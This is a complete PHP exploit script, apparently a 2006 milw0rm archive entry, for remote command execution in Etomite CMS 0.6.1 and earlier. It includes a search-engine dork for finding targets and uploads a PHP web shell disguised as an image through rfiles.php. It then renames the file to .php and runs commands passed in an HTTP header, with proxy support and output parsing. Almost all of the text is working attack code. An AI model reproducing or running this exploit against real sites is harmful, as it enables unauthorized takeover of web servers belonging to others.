#!/usr/bin/php -q -d short_open_tag=on
<?
echo "Etomite CMS <= 0.6.1 'rfiles.php' remote command execution\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n";
echo "google dork: \"Content managed by the Etomite Content Management System\"\r\n\r\n";

/*
works regardless of php.ini settings
*/

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to etomite\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /etomite/ \r\n";
echo "php ".$argv[0]." localhost / -P1.1.1.1:80\r\n";
die;
}

/*
software site: http://www.etomite.org/

explaination:

if you can call directly rfiles.php script you can upload an image file, then
you can rename it with .php extension, so you launch commands...

*/

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";
$port=80;
$proxy="";
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

srand(make_seed());
$anumber = rand(1,999);

$valid = array('gif', 'jpg', 'jpeg', 'png');
for ($i=0; $i<count($valid); $i++)
{
$data='-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="lang"

en
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="param"

upload
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="flist"

1
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="cimg"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="ilibs"

/
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="randomParam"

&w=150&h=150&zc=1
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="popClassName"

default
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="popTitle"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="in_srcnew"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="in_dirnew"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="nfile[]"; filename="suntzu'.$anumber.'.php.'.$valid[$i].'"
Content-Type:

<?php set_time_limit(0);echo "my_delim";passthru($_SERVER["HTTP_CLIENT_IP"]);echo "my_delim";?>
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="chkThumbSize[0]"

0
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="selRotate"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="pr_title"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="pr_alt"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="pr_class"

default
-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="pr_align"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="pr_border"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="pr_vspace"


-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="pr_hspace"

-----------------------------7d6341a4e0c5a
Content-Disposition: form-data; name="pr_captionClass"

default
-----------------------------7d6341a4e0c5a--
';

$packet ="POST ".$p."manager/media/ibrowser/scripts/rfiles.php HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."manager/media/ibrowser/ibrowser.php\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6341a4e0c5a\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

$data='-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="lang"

en
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="param"

rename|suntzu'.$anumber.'.php.'.$valid[$i].'|suntzu'.$anumber.'.php
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="flist"

1
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="cimg"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="ilibs"

'.$path.'manager/media/ibrowser/temp/
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="randomParam"

&w=150&h=150&zc=1
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="popClassName"

default
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="popTitle"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="in_srcnew"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="in_dirnew"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="nfile[]"; filename=""
Content-Type: application/octet-stream


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="chkThumbSize[0]"

0
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="selRotate"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="pr_title"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="pr_alt"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="pr_class"

default
-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="pr_align"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="pr_border"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="pr_vspace"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="pr_hspace"


-----------------------------7d62f31919f0218
Content-Disposition: form-data; name="pr_captionClass"

default
-----------------------------7d62f31919f0218--
';
$packet ="POST ".$p."manager/media/ibrowser/scripts/rfiles.php HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."manager/media/ibrowser/ibrowser.php\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62f31919f0218\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

$packet ="GET ".$p."manager/media/ibrowser/temp/suntzu".$anumber.".php HTTP/1.0\r\n";
$packet.="CLIENT-IP: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"my_delim"))
{
$temp=explode("my_delim",$html);
echo "exploit succeeded...\r\n";
die($temp[1]);
}
}
//if you are here...
echo "exploit failed...";
?>

# milw0rm.com [2006-07-25]
